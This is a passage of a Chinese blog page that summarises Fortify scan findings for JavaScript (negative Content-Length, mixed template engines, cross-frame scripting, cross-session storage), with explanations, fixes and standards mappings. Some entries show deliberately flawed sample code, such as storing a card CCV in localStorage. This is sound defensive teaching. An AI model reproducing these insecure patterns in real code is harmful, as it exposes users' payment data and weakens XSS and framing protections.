class="toc-number">1.5.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-62"><span class="toc-number">1.5.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-61"><span class="toc-number">1.5.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Null-Encryption-Key"><span class="toc-number">1.5.16.</span> <span class="toc-text">Key Management: Null Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-63"><span class="toc-number">1.5.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-63"><span class="toc-number">1.5.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-63"><span class="toc-number">1.5.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-62"><span class="toc-number">1.5.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management"><span class="toc-number">1.5.17.</span> <span class="toc-text">Password Management</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-64"><span class="toc-number">1.5.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-64"><span class="toc-number">1.5.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-64"><span class="toc-number">1.5.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-63"><span class="toc-number">1.5.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Empty-Password"><span class="toc-number">1.5.18.</span> <span class="toc-text">Password Management: Empty Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-65"><span class="toc-number">1.5.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-65"><span class="toc-number">1.5.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-65"><span class="toc-number">1.5.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-64"><span class="toc-number">1.5.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Hardcoded-Password"><span class="toc-number">1.5.19.</span> <span class="toc-text">Password Management: Hardcoded Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-66"><span class="toc-number">1.5.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-66"><span class="toc-number">1.5.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-66"><span class="toc-number">1.5.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-65"><span class="toc-number">1.5.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Null-Password"><span class="toc-number">1.5.20.</span> <span class="toc-text">Password Management: Null Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-67"><span class="toc-number">1.5.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-67"><span class="toc-number">1.5.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-67"><span class="toc-number">1.5.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-66"><span class="toc-number">1.5.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Password-in-Comment"><span class="toc-number">1.5.21.</span> <span class="toc-text">Password Management: Password in Comment</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-68"><span class="toc-number">1.5.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-68"><span class="toc-number">1.5.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-68"><span class="toc-number">1.5.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-67"><span class="toc-number">1.5.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Weak-Cryptography"><span class="toc-number">1.5.22.</span> <span class="toc-text">Password Management: Weak Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-69"><span class="toc-number">1.5.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-69"><span class="toc-number">1.5.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-69"><span class="toc-number">1.5.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-68"><span class="toc-number">1.5.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privacy-Violation"><span class="toc-number">1.5.23.</span> <span class="toc-text">Privacy Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-70"><span class="toc-number">1.5.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-70"><span class="toc-number">1.5.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-70"><span class="toc-number">1.5.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-69"><span class="toc-number">1.5.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Cryptographic-Hash"><span class="toc-number">1.5.24.</span> <span class="toc-text">Weak Cryptographic Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-71"><span class="toc-number">1.5.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-71"><span class="toc-number">1.5.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-71"><span class="toc-number">1.5.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-70"><span class="toc-number">1.5.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Encryption"><span class="toc-number">1.5.25.</span> <span class="toc-text">Weak Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-72"><span class="toc-number">1.5.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-72"><span class="toc-number">1.5.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-72"><span class="toc-number">1.5.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-71"><span class="toc-number">1.5.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Encryption-Insufficient-Key-Size"><span class="toc-number">1.5.26.</span> <span class="toc-text">Weak Encryption: Insufficient Key Size</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-73"><span class="toc-number">1.5.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-73"><span class="toc-number">1.5.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-73"><span class="toc-number">1.5.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-72"><span class="toc-number">1.5.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间和状态"><span class="toc-number">1.6.</span> <span class="toc-text">时间和状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Race-Condition"><span class="toc-number">1.6.1.</span> <span class="toc-text">Race Condition</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-74"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-74"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-74"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-73"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
         </div>
   <script type="text/javascript">
  function showToc(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:block");
    show_toc_btn.setAttribute("style","display:none");
    };
  function showBtn(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:none");
    show_toc_btn.setAttribute("style","display:block");
    };
   </script>
      
<!-- 目录内容结束 -->

    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://img-blog.csdnimg.cn/20201226182427732.jpg" alt="P1"></p>
<p>fortify扫描结果速查(JavaScript)，篇幅十分大，推荐使用ctrl+F查找~~~<br><a id="more"></a></p>
<h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="API误用"><a href="#API误用" class="headerlink" title="API误用"></a>API误用</h3><h4 id="Code-Correctness-Negative-Content-Length"><a href="#Code-Correctness-Negative-Content-Length" class="headerlink" title="Code Correctness: Negative Content-Length"></a>Code Correctness: Negative Content-Length</h4><h5 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Content-Length 头文件设为负值。</p>
<h5 id="EXPLANATION"><a href="#EXPLANATION" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在大多数情况下，设置 Content-Length 请求标题表示开发者对</p>
<p>发送给服务器的 POST 数据长度感兴趣。但是，此标题应为 0 或正整数。</p>
<p>示例 1：以下代码错误地将 Content-Length 头文件设置为负值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.setRequestHeader(&quot;Content-Length&quot;, &quot;-1000&quot;);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS"><a href="#RECOMMENDATIONS" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请使用能正确计算和设置 Content-Length 头文件的 javascript 库。</p>
<h5 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398 </p>
<p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6 </p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[6] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<h4 id="Often-Misused-Mixing-Template-Languages"><a href="#Often-Misused-Mixing-Template-Languages" class="headerlink" title="Often Misused: Mixing Template Languages"></a>Often Misused: Mixing Template Languages</h4><h5 id="ABSTRACT-1"><a href="#ABSTRACT-1" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不得混合模板语言，以防止绕过 cross-site scripting 保护。</p>
<h5 id="EXPLANATION-1"><a href="#EXPLANATION-1" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>混合模板引擎时，意味着之前为模板实施的保护可能不再起作用，或不再有效。在危害最轻的情况下，这可能会导致功能无法按预期运行，但还可能会让恶意用户能够规避引擎保护，从而引发 cross-site scripting 漏洞。 </p>
<p>示例1：在以下代码中，将 AngularJS 模块配置为使用“[[”和“]]”作为表达式分隔符，而不是使用默认值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">myModule.config(function($interpolateProvider)&#123;</span><br><span class="line"></span><br><span class="line">    $interpolateProvider.startSymbol(&quot;[[&quot;);</span><br><span class="line"></span><br><span class="line">    $interpolateProvider.endSymbol(&quot;]]&quot;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这可能会导致其他模板引擎执行验证，以转义可能与 AngularJS 表达式不兼容的表达式，因而可能会使用户可以绕过常规验证，在浏览器中运行他们自己的代码。</p>
<h5 id="RECOMMENDATIONS-1"><a href="#RECOMMENDATIONS-1" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>通常最好完全不要混合模板引擎。如果混合，从开发人员的角度而言，将极难同时保护两种模板引擎，而且强制执行这些验证的模板引擎未考虑一种情况，即您可能会将它们的模板引擎与其他模板引擎同时运行。</p>
<h5 id="REFERENCES-1"><a href="#REFERENCES-1" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] AngularJS $interpolateProvider documentation Google</p>
<p>[2] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><h4 id="Cross-Frame-Scripting"><a href="#Cross-Frame-Scripting" class="headerlink" title="Cross-Frame Scripting"></a>Cross-Frame Scripting</h4><h5 id="ABSTRACT-2"><a href="#ABSTRACT-2" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果未能限制在 iframe 内包含应用程序，则会导致跨站请求伪造或钓鱼攻击。</p>
<h5 id="EXPLANATION-2"><a href="#EXPLANATION-2" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当应用程序出现以下情况时，将出现 cross-frame scripting 漏洞：</p>
<ol>
<li><p>允许自身包含在 iframe 内。</p>
</li>
<li><p>未能通过 X-Frame-Options 标头指定组帧策略。</p>
</li>
<li><p>使用不力保护，如基于 JavaScript 的 frame busting 逻辑。</p>
</li>
</ol>
<p>跨框架脚本漏洞经常为 clickjacking 攻击奠定基础，攻击者可利用其执行跨站请求伪造或钓鱼攻击。</p>
<h5 id="RECOMMENDATIONS-2"><a href="#RECOMMENDATIONS-2" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>现代浏览器支持 X-Frame-Options HTTP 标头，它指示允许在帧内还是 iframe 内加载资源。如果响应包含值为 SAMEORIGIN 的标头，则当请求来自同一个站点时，浏览器将只在帧中加载资源。如果标头设置为 DENY，则无论站点是否发出请求，浏览器都将阻止在帧中加载资源。</p>
<p>Helmet 中间件可与 Express 应用程序一起使用，以便于在所有响应中自动包含此标头。使用以下设置启用 XFrameOptionsMiddleware</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet()); //defaults to SAMEORIGIN</span><br><span class="line"></span><br><span class="line">//alternatively for SAMEORIGIN app.use(helmet.frameguard(&#123;action: &apos;sameorigin&apos;&#125;);</span><br><span class="line"></span><br><span class="line">//alternatively for DENY framing app.use(helmet.frameguard(&#123;action: &apos;deny&apos;&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-2"><a href="#REFERENCES-2" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Cross Frame Scripting </p>
<p>[2] OWASP Clickjacking </p>
<p>[3] OWASP Clickjacking Defense Cheat Sheet </p>
<p>[4] Node.js Security Checklist </p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 1021 </p>
<p>[6] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-001941, CCI-001942 </p>
<p>[7] Standards Mapping - FIPS200 SI </p>
<p>[8] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 14.4.3 HTTP Security Headers Requirements, 14.4.7 HTTP Security Headers Requirements </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002500 CAT II </p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Server Misconfiguration (WASC-14) </p>
<h4 id="Cross-Session-Contamination"><a href="#Cross-Session-Contamination" class="headerlink" title="Cross-Session Contamination"></a>Cross-Session Contamination</h4><h5 id="ABSTRACT-3"><a href="#ABSTRACT-3" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在 localStorage 和 sessionStorage 之间传输值会不知不觉地暴露敏感信息。</p>
<h5 id="EXPLANATION-3"><a href="#EXPLANATION-3" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTML5 提供 localStorage 和 sessionStorage 映射，以支持开发人员保留程序值。sessionStorage 映射仅在页面实例和即时浏览器会话期间为调用页面提供存储。但是，localStorage 映射会提供可供多个页面实例和浏览器实例访问的存储。此功能允许应用程序在多个浏览器选项卡或窗口中保留和使用同一信息。</p>
<p>例如，开发人员可能希望在旅游应用程序中使用多个浏览器选项卡或实例，以支持用户打开多个选项卡来比较住宿选择，同时保留用户最初的搜索条件。在传统的 HTTP 存储方法中，用户会面临在一个选项卡中执行的购买和决策（并存储在会话或 cookies 中）与另一个选项卡中的购买相干扰的风险。</p>
<p>借助跨多个浏览器选项卡使用用户值的功能，开发人员必须多加小心，以免将敏感信息从 sessionStorage 范围移至 localStorage，反之亦然。</p>
<p>示例：以下示例将信用卡 CCV 信息存储在会话中，表明用户已授权该站点收取文件中卡的购买费用。对于在浏览器选项卡环境中的每个购买尝试，都需要信用卡许可。为避免重新输入 CCV，此信息被存储在 sessionStorage 对象中。但是，开发人员还将信息存储在 localStorage 对象中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">    sessionStorage.setItem(&quot;userCCV&quot;, currentCCV);</span><br><span class="line"></span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">    if (e == QUOTA_EXCEEDED_ERR) &#123;</span><br><span class="line"></span><br><span class="line">        alert(&apos;Quota exceeded.&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    var retrieveObject = sessionStorage.getItem(&quot;userCCV&quot;);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">     localStorage.setItem(&quot;userCCV&quot;,retrieveObject);</span><br><span class="line"></span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">     if (e == QUOTA_EXCEEDED_ERR) &#123;</span><br><span class="line"></span><br><span class="line">        alert(&apos;Quota exceeded.&apos;);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">     ...</span><br><span class="line"></span><br><span class="line">     var userCCV = localStorage.getItem(&quot;userCCV&quot;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>通过将信息放回localStorage对象中，此 CCV 信息在其他浏览器选项卡和新调用的浏览器中可用。这样可以绕开预期工作流的应用程序逻辑。</p>
<h5 id="RECOMMENDATIONS-3"><a href="#RECOMMENDATIONS-3" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要将敏感数值或业务工作流所依赖的值存储在 localStorage 或 sessionStorage 范围中。将数据从一种存储格式迁移至另一种存储格式时，需要考虑迁移对于问题数据的隐私性和依赖该数据的业务逻辑的影响。</p>
<h5 id="REFERENCES-3"><a href="#REFERENCES-3" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 501 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001090, CCI-002361 </p>
<p>[3] Standards Mapping - FIPS200 SI </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-4 Information in Shared Resources (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.8 </p>
<p>[15] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.4 - Authentication and Access Control </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000060 CAT II, APSC-DV-002380 CAT II </p>
<p>[33] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[34] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Cross-Site-Request-Forgery"><a href="#Cross-Site-Request-Forgery" class="headerlink" title="Cross-Site Request Forgery"></a>Cross-Site Request Forgery</h4><h5 id="ABSTRACT-4"><a href="#ABSTRACT-4" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>HTTP 请求必须包含用户特有的机密，以防止攻击者发出未经授权的请求。</p>
